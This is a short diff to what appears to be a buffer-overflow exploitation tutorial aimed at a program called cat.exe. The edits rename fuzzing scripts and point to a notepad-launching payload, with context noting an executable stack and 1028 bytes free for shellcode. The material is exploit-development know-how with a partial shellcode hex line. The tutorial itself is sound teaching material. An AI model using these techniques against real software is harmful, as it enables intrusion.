@@ -233,7 +233,7 @@ with open('pattern.dat', 'w') as f:
  * Profit!
  
 ```
-> fuzz3.py
+> fuzz4.py
 > ImmunityDebugger.exe cat.exe pattern.dat
 ```
  
@@ -259,7 +259,7 @@ with open('pattern.dat', 'w') as f:
  * It's possible to write code to the stack which is executed.
 
 > This leaves us with 1028 bytes for a payload to weaponize this exploit.
-  See `exploit_cat.py`
+  See `fuzz5.py` which will use a payload.
 ### .. Code for `fuzz4.py`
 ```python
 from struct import pack
@@ -295,7 +295,7 @@ ddc6d97424f4bebb27ecb25d29c9b13431751883edfc0375afc5194e278be ...... ecfbab8afa5
 
  * Test
 ```
-> exploit.py payload.dat [exploit.dat]
+> fuzz5.py payload_run_notepad.msfv
 > ImmunityDebugger.exe cat.exe exploit.dat
 ```
 
